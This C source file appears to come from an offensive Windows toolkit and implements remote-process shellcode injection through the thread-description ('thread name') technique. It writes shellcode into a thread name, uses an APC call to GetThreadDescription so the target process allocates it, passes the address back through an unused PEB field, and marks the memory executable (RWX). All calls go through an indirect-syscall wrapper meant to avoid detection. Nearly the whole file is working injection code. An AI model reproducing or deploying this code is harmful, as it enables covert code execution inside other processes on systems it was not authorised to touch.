/*
*   Description: ThreadName alloc/writing & Heap encryption
*/

#include <windows.h>
#include <unwin.h>

#include <stdio.h>

#include "../syscalls/syscalls.h"
#include "../debugging/debugging.h"
#include "memory.h"

#define UNSED_PEB_FIELD 0x340

extern Ade GlobalAde;
static NTSTATUS status;

typedef struct TEMP_DATA_CALL_ {
    LPVOID Address;
    SIZE_T Size; 
} TEMP_DATA_CALL;

NTSTATUS CustomSetThreadDescription(HANDLE hThread, BYTE* buf, SIZE_T bufSize) {
    AdeSinner      sinner;
    UNICODE_STRING bufString;

    //
    // Make a buffer full of 0x01 
    //
    BYTE* backet = malloc(bufSize + sizeof(WCHAR));
    memset(backet, 'A', bufSize);

    DEBUG_INFO("Allocated: %lld", bufSize + sizeof(WCHAR));
    //
    // Init the Unicode string
    //
    status = RtlInitUnicodeStringEx(&bufString, (PWCHAR)backet);
    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("RtlInitUnicodeString FAILED");
        return status;
    }

    //
    // Copy the original buffer into the UNICODE_STRING
    //
    memcpy(bufString.Buffer, buf, bufSize);

    DEBUG_INFO("Shellcode BufString @ 0x%p", bufString.Buffer);

    //
    // Set the thread-name
    //
    CallAde(sinner, "NtSetInformationThread", status,
        hThread,
        (THREADINFOCLASS) 0x26, // ThreadNameInformation
        (PVOID) &bufString,
        (ULONG) sizeof(UNICODE_STRING)
    );

    return status;
}

WINBOOL ThreadNameAlloc(
    HANDLE hProcess,
    PBYTE shellcode,
    size_t shellcodeSize,
    MEMORY_ALLOC* MemoryAllocOut 
) {
    TEMP_DATA_CALL            tempDataCall;
    AdeSinner                 sinner;
    ULONG_PTR                 pebField; // UNUSED PEB FIELD
    PPEB                      ptrPeb;
    PROCESS_BASIC_INFORMATION pbi;

    //
    // Get remote process information
    //
    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof( PROCESS_BASIC_INFORMATION ),
        NULL
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtQueryInformationProcess: 0x%lx", status);
        return FALSE;
    }

    //
    // Get remote PEB
    //
    ptrPeb = pbi.PebBaseAddress;

    //
    // Set a unsed field for passing information
    //
    pebField = (ULONG_PTR) ptrPeb + UNSED_PEB_FIELD;

    //
    // Create new thread for the purpose of calling: `GetThreadDescription`
    //
    HANDLE hThread;

    CallAde(sinner, "NtCreateThreadEx", status,
        &hThread,
        THREAD_ALL_ACCESS,
        (POBJECT_ATTRIBUTES) NULL,
        hProcess,
        (PUSER_THREAD_START_ROUTINE) ExitThread,
        NULL,
        THREAD_CREATE_FLAGS_CREATE_SUSPENDED, // CREATE_SUSPENDED but for NTAPI
        (ULONG) 0,
        (SIZE_T) 0,
        (SIZE_T) 0,
        (PPS_ATTRIBUTE_LIST) NULL
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtCreateThreadEx: 0x%lx", status);
        return FALSE;
    }

    //
    // Set the shellcode into the thread-name 
    //
    status = CustomSetThreadDescription(
        hThread,
        shellcode,
        shellcodeSize
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("CustomSetThreadDescription: 0x%lx", status);
        return FALSE;
    }

    // 
    // Call `GetThreadDescription` and orbain the new allocation addr into the PEB field
    //
    CallAde(sinner, "NtQueueApcThread", status,
        (HANDLE) hThread,
        (PPS_APC_ROUTINE) GetThreadDescription,
        (void*) NtCurrentThread,
        (void*) pebField,
        (void*) 0
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtQueueApcThread: 0x%lx", status);
        return FALSE;
    }

    //
    // Execute the APC chain and wait
    //
    ResumeThread(hThread);
    WaitForSingleObject(hThread, INFINITE);

    //
    // Read the new allocation addr into PEB field
    //
    void* ptrShellcode   = NULL;
    CallAde(sinner, "NtReadVirtualMemory", status,
        hProcess,
        (LPVOID)pebField,
        &ptrShellcode,
        sizeof(void*),
        NULL
    );

    DEBUG_INFO("REMOTE SHELLCODE (%lld): 0x%p", shellcodeSize, ptrShellcode);

    if ( NT_ERROR(status) || ptrShellcode == NULL ) {
        DEBUG_ERROR("ReadProcessMemory: 0x%lx", GetLastError());
        return FALSE;
    }

    //
    // Set to RWX
    //
    DWORD oldProtection   = 0x0;
    tempDataCall.Address  = ptrShellcode;
    tempDataCall.Size     = shellcodeSize;

    MEMORY_BASIC_INFORMATION mbi;

    CallAde(sinner, "NtQueryVirtualMemory", status,
        hProcess,
        ptrShellcode,
        (MEMORY_INFORMATION_CLASS) MemoryBasicInformation,
        (PMEMORY_BASIC_INFORMATION) &mbi,
        sizeof(mbi),
        NULL
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtQueryVirtualMemory: 0x%lx", status);
        return FALSE;
    }

    DEBUG_INFO(
        "SHELLCODE MEMORY INFO :: \n"
        "\tBase Address: 0x%p\n" 
        "\tRegion Size: %lld\n"
        "\tAllocation Base: 0x%p\n"
        "\tState: %ld\n" 
        "\tProtect: %lx",
        mbi.BaseAddress, mbi.RegionSize, mbi.AllocationBase, mbi.State, mbi.Protect);

    CallAde(sinner, "NtProtectVirtualMemory", status,
        hProcess,
        &mbi.BaseAddress,
        &mbi.RegionSize,
        PAGE_EXECUTE_READWRITE,
        &oldProtection
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtProtectVirtualMemory: 0x%lx", status);
        return FALSE;
    }

    MemoryAllocOut->executionAddr = ptrShellcode;
    
    return TRUE;
}
